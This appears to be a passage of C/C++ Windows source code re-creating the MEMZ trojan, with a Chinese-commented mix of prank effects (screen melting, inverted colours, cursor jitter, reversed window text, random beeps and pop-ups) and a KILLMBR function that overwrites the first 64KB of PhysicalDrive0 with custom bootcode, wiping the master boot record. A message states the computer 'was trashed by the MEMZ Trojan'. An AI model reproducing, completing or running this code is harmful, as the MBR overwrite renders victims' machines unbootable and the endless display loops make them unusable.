	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}

void payloadChangeText() {
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
}
void infChange(){
	for(;;){
		payloadChangeText();
		Sleep(200);
	}
}

void RandCursor(){
	POINT p;
	GetCursorPos(&p);
	int sxs,sys,sxl,syl;
	sxs=p.x-3;
	sys=p.y-3;
	sxl=p.x+3;
	syl=p.y+3;
	SetCursorPos(random_in(sxs,sxl),random_in(sys,syl));
}
void infCursor(){
	for(;;){
		RandCursor();
		Sleep(30);
	}
}

void RandIcon(){
	int cx = GetSystemMetrics(SM_CXFULLSCREEN);
	int cy = GetSystemMetrics(SM_CYFULLSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_QUESTION));
	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WARNING));
	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_ERROR));
	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_INFORMATION));
	DrawIcon(hdc,random_in(0,cx),random_in(0,cy),LoadIcon(NULL,IDI_WINLOGO));
}
void infIcon(){
	for(;;){
		RandIcon();
		Sleep(10);
	}
}

void KILLMBR(){
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE)
		ExitProcess(2);

	unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);

	// Join the two code parts together
	int i = 0;
	for (; i < code1_len; i++)
		*(bootcode + i) = *(code1 + i);
	for (i = 0; i < code2_len; i++)
		*(bootcode + i + 0x1fe) = *(code2 + i);

	DWORD wb;
	if (!WriteFile(drive, bootcode, 65536, &wb, NULL))
		ExitProcess(3);

	CloseHandle(drive);

}

string rand_str(const int len)  /*参数为字符串的长度*/
{
    /*初始化*/
    string str;                 /*声明用来保存随机字符串的str*/
    char c;                     /*声明字符c，用来保存随机生成的字符*/
    int idx;                    /*用来循环的变量*/
    /*循环向字符串中添加随机生成的字符*/
    for(idx = 0;idx < len;idx ++)
    {
        /*rand()%26是取余，余数为0~25加上'a',就是字母a~z,详见asc码表*/
        c = 'a' + rand()%26;
        str.push_back(c);       /*push_back()是string类尾插函数。这里插入随机字符c*/
    }
    return str;                 /*返回生成的随机字符串*/
}


LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			int x = rand() % (scrw - pcs->cx);
			int y = rand() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

int tunnel() {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);
	return 200.0 / (times / 5.0 + 1) + 4;
}

void inftunnel(){
	for(;;){
		tunnel();
		Sleep(2000);
	}
}

int DrawErrors() {
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (rand() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, rand()%scrw, rand()%scrh, LoadIcon(NULL, IDI_WARNING));
	}
	
	ReleaseDC(hwnd, hdc);

	return 2;
}

void randomDraw(){
	for(;;){
		DrawErrors();
	}
}

int payloadSound() {
	PlaySoundA(sounds[rand() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
	return 20 + (rand() % 20);
}

void infplay(){
	for(;;){
		payloadSound();
		Sleep(1000);
	}
}

int payloadBlink() {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 100;
}

void infBlink(){
	for(;;){
		payloadBlink();
		Sleep(random_in(200,5000));
	}
}

void InvertColor_slow(){
	for(;;){
		HDC hdcDesktop;
		hdcDesktop = GetDC(DESKTOP_WINDOW);

		for (int i = 0; i < scrh; i++) {
			BitBlt(hdcDesktop, 0, i, scrw, 1, hdcDesktop, 0, i, NOTSRCCOPY);
		}

		ReleaseDC(0, hdcDesktop);

	}

}

void ScreenMelter(){
	time_t t;
	srand((unsigned) time(&t));
	
	HDC screenDC = GetDC(NULL);
	
	int scrWidth = GetDeviceCaps(screenDC, HORZRES);
	int scrHeight = GetDeviceCaps(screenDC, VERTRES);
	
	int x;
	while(1){
		HDC screenDC = GetDC(NULL);
		x = rand() % scrWidth;
		BitBlt(screenDC, x, 1, 10, scrHeight, screenDC, x, 0, SRCCOPY);
		Sleep(2);
	}
}
void Shake(){
	RECT rect;//RECT是一个矩形结构体，相当于保存矩形边框的四个坐标
    HWND hwnd = NULL, oldhwnd = NULL;//两个窗口句柄
    int x, y, width, height;//保存窗口横纵坐标及高度，宽度
    int i;
    for (i = 0; i < 50; i++)
    {
        hwnd = GetForegroundWindow();//获取活动窗口句柄
        if (hwnd != oldhwnd)
        {
            GetWindowRect(hwnd, &rect);//获取指定窗口位置
            x = rect.left;
            y = rect.top;
            width = rect.right - x;
            height = rect.bottom - y;

            oldhwnd = hwnd;//把刚刚获取的句柄保存起来
        }
	}
        MoveWindow(hwnd, x - 10, y, width, height, TRUE);
        Sleep(5);
        MoveWindow(hwnd, x - 10, y - 10, width, height, TRUE);
        Sleep(5);
        MoveWindow(hwnd, x, y - 10, width, height, TRUE);
        Sleep(5);
        MoveWindow(hwnd, x, y, width, height, TRUE);
        Sleep(5);
}
void infShock(){
	for(;;){
		Shake();
	}
}
void iconAura(){
	int x,y,dx,dy,angle,i;
	double xx,yy;
	POINT cp;
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
         //寄存器//
	HWND hWnd;
    SendMessage(hWnd, WM_SETREDRAW, FALSE, 0L);
	
	while(true)
	{
		for (i = 0; i <= 45; i++){
			GetCursorPos(&cp);
			x = cp.x-80, y = cp.y-80;
			dx = cp.x, dy = cp.y;
			angle = -2 * i;
			xx = (x - dx)*cos(angle * PI / 45) - (y-dy)*sin(angle * PI / 45) + dx;//计算+ 
			yy = (y-dy)*cos(angle * PI / 45) + (x-dx)*sin(angle * PI / 45) + dy;//计算 
			
			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_QUESTION));
			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_WARNING));
			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_ERROR));
			x = cp.x+80, y = cp.y+80;
			dx = cp.x, dy = cp.y;
			angle = -2 * i;
			xx = (x - dx)*cos(angle * PI / 45) - (y-dy)*sin(angle * PI / 45) + dx;//计算-
			yy = (y-dy)*cos(angle * PI / 45) + (x-dx)*sin(angle * PI / 45) + dy;//计算 
			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_INFORMATION));
			DrawIcon(hdc,(xx),(yy),LoadIcon(NULL,IDI_WINLOGO));
			//Sleep(25);
		}	
	}
}
void randomSeed(){
	for(;;){
		srand((int)time(0));
		Sleep(300);
	}
}

int random() {
	if (prov == '\0')
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

int payloadMessageBox() {
	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
	return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

int glitch() {	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 200.0 / (times / 5.0 + 1) + 3;
}

void infglitch(){
	for(;;){
		glitch();
		Sleep(1500);
	}
}
void sayNyan(){ // Decompile By NyanConsole! (I Think This Code Need Optimize...)
	const CHAR *v1; // ebx
	HMODULE ModuleHandleA; // eax
	HANDLE ImageA; // eax
	HANDLE StdHandle; // eax
	HANDLE h[12]; // [esp+5Ch] [ebp-6Ch]
	int v15; // [esp+A0h] [ebp-28h]
	LPCSTR lpString; // [esp+A4h] [ebp-24h]
	int i; // [esp+B4h] [ebp-14h]
	int v21; // [esp+B8h] [ebp-10h]
	int v22; // [esp+BCh] [ebp-Ch]

	v22 = 10000;
	v21 = 0;
	while ( v22 <= 10011 )
	{
		v1 = (const CHAR *)(unsigned __int16)v22;
		ModuleHandleA = GetModuleHandleA(0);
		ImageA = LoadImageA(ModuleHandleA, v1, 0, 0, 0, 0x2040u);
		h[v21] = ImageA;
		++v22;
		++v21;
	}
	lpString = "Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...";
	v15 = lstrlenA("Your computer was trashed by the MEMZ Trojan. Now enjoy the Nyan Cat...");
	for ( i = 0; i < v15; ++i )
	{
		StdHandle = GetStdHandle(0xFFFFFFF5);
		SetConsoleTextAttribute(StdHandle, 0x800Fu);
		putchar(lpString[i]);
		Sleep(0x32u);
	}
}

void randomOutput(){
	for(;;){
		printf("%s",rand_str(random_in(5,50)).c_str());
	}
}
void rand_beep(){
	for(;;){
		Beep(random_in(20,20000), random_in(2,500));
		Sleep(random_in(200,1500));
	}
}
